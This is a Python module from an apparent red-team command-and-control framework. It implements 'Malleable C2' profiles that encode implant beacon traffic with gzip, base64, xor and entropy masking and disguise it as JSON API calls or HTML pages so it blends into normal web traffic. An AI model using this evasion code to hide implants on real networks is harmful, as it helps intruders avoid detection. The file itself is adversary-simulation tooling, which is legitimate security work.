"""
AEGIS-SILENTIUM — shared/profiles/malleable.py
============================================
Python implementation of the Malleable C2 profile engine.

Mirrors the Go relay's profile logic so that Python implants can apply the
same transformations, producing traffic that matches the configured profile.

Supported containers:  json | html | raw
Supported transforms:  base64 | base64url | gzip | xor | prepend | append | mask

Profile files are YAML; the same YAML files used by the Go relay are
loaded here without modification.

AUTHORIZED USE ONLY — professional adversary simulation.
"""

from __future__ import annotations

import base64
import gzip
import hashlib
import html
import json
import logging
import os
import random
import re
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional

log = logging.getLogger("aegis.profiles")

try:
    import yaml
    _YAML_AVAILABLE = True
except ImportError:
    _YAML_AVAILABLE = False


# ────────────────────────────────────────────────────────────────────────────
# ALPHA for entropy masking (must match relay)
# ────────────────────────────────────────────────────────────────────────────
_MASK_ALPHA = "abcdefghijklmnopqrstuvwxyzABCDEF"


def _mask_entropy(data: bytes) -> bytes:
    out = bytearray(len(data) * 2)
    for i, b in enumerate(data):
        out[i * 2] = ord(_MASK_ALPHA[b >> 4])
        out[i * 2 + 1] = ord(_MASK_ALPHA[b & 0x0F])
    return bytes(out)


def _unmask_entropy(data: bytes) -> bytes:
    decode = {ord(c): i for i, c in enumerate(_MASK_ALPHA)}
    out = bytearray(len(data) // 2)
    for i in range(len(out)):
        out[i] = (decode.get(data[i * 2], 0) << 4) | decode.get(data[i * 2 + 1], 0)
    return bytes(out)


# ────────────────────────────────────────────────────────────────────────────
# Transform application
# ────────────────────────────────────────────────────────────────────────────
def _apply_transform(data: bytes, op: str, arg: str = "") -> bytes:
    if op == "base64":
        return base64.b64encode(data)
    elif op == "base64url":
        return base64.urlsafe_b64encode(data).rstrip(b"=")
    elif op == "gzip":
        return gzip.compress(data, compresslevel=9)
    elif op == "xor":
        key = arg.encode() if arg else b"\x5a"
        return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
    elif op == "prepend":
        return arg.encode() + data
    elif op == "append":
        return data + arg.encode()
    elif op == "mask":
        return _mask_entropy(data)
    else:
        log.warning("unknown transform op: %s", op)
        return data


def _reverse_transform(data: bytes, op: str, arg: str = "") -> bytes:
    if op == "base64":
        return base64.b64decode(data + b"=" * (-len(data) % 4))
    elif op == "base64url":
        padded = data + b"=" * (-len(data) % 4)
        return base64.urlsafe_b64decode(padded)
    elif op == "gzip":
        return gzip.decompress(data)
    elif op == "xor":
        return _apply_transform(data, "xor", arg)  # self-inverse
    elif op == "prepend":
        pfx = arg.encode()
        return data[len(pfx):] if data.startswith(pfx) else data
    elif op == "append":
        sfx = arg.encode()
        return data[:-len(sfx)] if data.endswith(sfx) else data
    elif op == "mask":
        return _unmask_entropy(data)
    else:
        return data


# ────────────────────────────────────────────────────────────────────────────
# Container wrap / unwrap
# ────────────────────────────────────────────────────────────────────────────
def _pseudo_random_string(n: int = 16) -> str:
    return base64.urlsafe_b64encode(os.urandom(n)).decode()[:n]


def _wrap_container(data: bytes, container: str, key: str = "") -> bytes:
    if container == "json":
        k = key or "d"
        obj = {
            k: data.decode("latin-1"),
            "_t": int(time.time()),
            "_v": "1.0",
            "clientId": _pseudo_random_string(16),
        }
        return json.dumps(obj, separators=(",", ":")).encode()
    elif container == "html":
        anchor = key or "data"
        payload_str = data.decode("latin-1")
        return (
            f"<!DOCTYPE html><html><head><title>Loading...</title></head>"
            f"<body><!-- {anchor}:{payload_str} --><p>Please wait...</p></body></html>"
        ).encode()
    else:  # raw
        return data


def _unwrap_container(data: bytes, container: str, key: str = "") -> bytes:
    if container == "json":
        k = key or "d"
        try:
            obj = json.loads(data)
            val = obj[k]
            return val.encode("latin-1") if isinstance(val, str) else val
        except Exception as e:
            raise ValueError(f"JSON container unwrap failed (key={k!r}): {e}") from e
    elif container == "html":
        anchor = key or "data"
        s = data.decode("latin-1")
        pfx = f"<!-- {anchor}:"
        sfx = " -->"
        start = s.find(pfx)
        if start == -1:
            raise ValueError("html anchor not found")
        start += len(pfx)
        end = s.find(sfx, start)
        if end == -1:
            raise ValueError("html anchor close not found")
        return s[start:end].encode("latin-1")
    else:
        return data


# ────────────────────────────────────────────────────────────────────────────
# Transform block
# ────────────────────────────────────────────────────────────────────────────
@dataclass
class Transform:
    op: str
    arg: str = ""


@dataclass
class TransformBlock:
    transforms: List[Transform] = field(default_factory=list)
    container: str = "raw"
    key: str = ""

    def apply(self, data: bytes) -> bytes:
        """Forward: apply transforms then wrap in container (client→wire)."""
        buf = data
        for t in self.transforms:
            buf = _apply_transform(buf, t.op, t.arg)
        return _wrap_container(buf, self.container, self.key)

    def strip(self, data: bytes) -> bytes:
        """Reverse: unwrap container then reverse transforms (wire→client)."""
        buf = _unwrap_container(data, self.container, self.key)
        for t in reversed(self.transforms):
            buf = _reverse_transform(buf, t.op, t.arg)
        return buf

    @classmethod
    def from_dict(cls, d: dict) -> "TransformBlock":
        if not d or not isinstance(d, dict):
            return cls()
        transforms = []
        for t in (d.get("transforms") or []):
            if t and isinstance(t, dict):
                transforms.append(Transform(op=t.get("op", ""), arg=t.get("arg", "")))
        return cls(
            transforms=transforms,
            container=d.get("container", "raw"),
            key=d.get("key", ""),
        )


# ────────────────────────────────────────────────────────────────────────────
# Malleable Profile
# ────────────────────────────────────────────────────────────────────────────
@dataclass
class MalleableProfile:
    name: str = "default"
    version: str = "1.0"
    client: TransformBlock = field(default_factory=TransformBlock)
    server: TransformBlock = field(default_factory=TransformBlock)
    default_headers: Dict[str, str] = field(default_factory=dict)
    uris: List[str] = field(default_factory=lambda: ["/api/v1/events", "/api/v1/auth/token"])

    @property
    def beacon_uri(self) -> str:
        return self.uris[0] if self.uris else "/b"

    @property
    def handshake_uri(self) -> str:
        return self.uris[1] if len(self.uris) > 1 else "/h"

    def get_headers(self) -> Dict[str, str]:
        """Return headers dict with 'auto' values replaced with random values."""
        headers = {}
        for k, v in self.default_headers.items():
            if v == "auto":
                headers[k] = _pseudo_random_string(32)
            else:
                headers[k] = v
        return headers

    @classmethod
    def from_yaml(cls, path: str) -> "MalleableProfile":
        """Load a Malleable C2 profile from a YAML file.

        Falls back to the built-in default profile if the file is empty,
        unreadable, or contains no valid keys — so that a missing or blank
        profile file never causes an AttributeError at runtime.
        """
        if not _YAML_AVAILABLE:
            raise ImportError("PyYAML is required for profile loading: pip install pyyaml")
        try:
            with open(path, "r") as f:
                data = yaml.safe_load(f)
        except FileNotFoundError:
            log.warning("profile file not found: %s — using built-in default", path)
            return cls.default()
        except Exception as e:
            log.warning("failed to parse profile %s: %s — using built-in default", path, e)
            return cls.default()
        if not data or not isinstance(data, dict):
            log.warning("profile file %s is empty or invalid — using built-in default", path)
            return cls.default()
        return cls._from_dict(data)

    @classmethod
    def from_dict(cls, data: dict) -> "MalleableProfile":
        """Load a profile from a plain dict.  Returns default if dict is None/empty."""
        if not data or not isinstance(data, dict):
            return cls.default()
        return cls._from_dict(data)

    @classmethod
    def _from_dict(cls, d: dict) -> "MalleableProfile":
        """Internal builder.  Caller must guarantee d is a non-None dict."""
        if d is None:
            d = {}
        return cls(
            name=d.get("name", "default"),
            version=str(d.get("version", "1.0")),
            client=TransformBlock.from_dict(d.get("client") or {}),
            server=TransformBlock.from_dict(d.get("server") or {}),
            default_headers=d.get("default_headers") or {},
            uris=d.get("uris") or ["/b", "/h"],
        )

    @classmethod
    def default(cls) -> "MalleableProfile":
        """Return the built-in default profile (JSON container, gzip+base64)."""
        return cls._from_dict({
            "name": "default",
            "version": "1.0",
            "client": {
                "container": "json",
                "key": "events",
                "transforms": [
                    {"op": "gzip"},
                    {"op": "base64"},
                ],
            },
            "server": {
                "container": "json",
                "key": "data",
                "transforms": [
                    {"op": "gzip"},
                    {"op": "base64"},
                ],
            },
            "default_headers": {
                "X-Request-Id": "auto",
                "Cache-Control": "no-store",
            },
            "uris": ["/api/v1/events", "/api/v1/auth/token"],
        })


# ────────────────────────────────────────────────────────────────────────────
# ProfileEngine: load + cache profiles, apply to requests
# ────────────────────────────────────────────────────────────────────────────
class ProfileEngine:
    """
    Manages loading, caching, and application of Malleable C2 profiles.

    Usage
    ─────
    engine = ProfileEngine()
    engine.load("/path/to/profile.yaml")
    profile = engine.get()

    # Encode outgoing beacon body
    wire_bytes = engine.encode_client(json_payload_bytes)

    # Decode incoming server response
    plaintext = engine.decode_server(response_bytes)
    """

    def __init__(self, profile: Optional[MalleableProfile] = None):
        self._profile = profile or MalleableProfile.default()

    def load(self, path: str) -> None:
        self._profile = MalleableProfile.from_yaml(path)
        log.info("loaded Malleable profile: %s v%s", self._profile.name, self._profile.version)

    def load_dict(self, d: dict) -> None:
        self._profile = MalleableProfile.from_dict(d)

    def get(self) -> MalleableProfile:
        return self._profile

    def encode_client(self, data: bytes) -> bytes:
        """Apply client transforms (implant → wire format)."""
        return self._profile.client.apply(data)

    def decode_client(self, data: bytes) -> bytes:
        """Reverse client transforms (wire format → implant payload)."""
        return self._profile.client.strip(data)

    def encode_server(self, data: bytes) -> bytes:
        """Apply server transforms (relay response → wire format)."""
        return self._profile.server.apply(data)

    def decode_server(self, data: bytes) -> bytes:
        """Reverse server transforms (wire format → plaintext response)."""
        return self._profile.server.strip(data)

    def get_request_headers(self) -> Dict[str, str]:
        return self._profile.get_headers()

    @property
    def beacon_uri(self) -> str:
        return self._profile.beacon_uri

    @property
    def handshake_uri(self) -> str:
        return self._profile.handshake_uri


# ────────────────────────────────────────────────────────────────────────────
# Exports
# ────────────────────────────────────────────────────────────────────────────
__all__ = [
    "MalleableProfile",
    "ProfileEngine",
    "TransformBlock",
    "Transform",
]
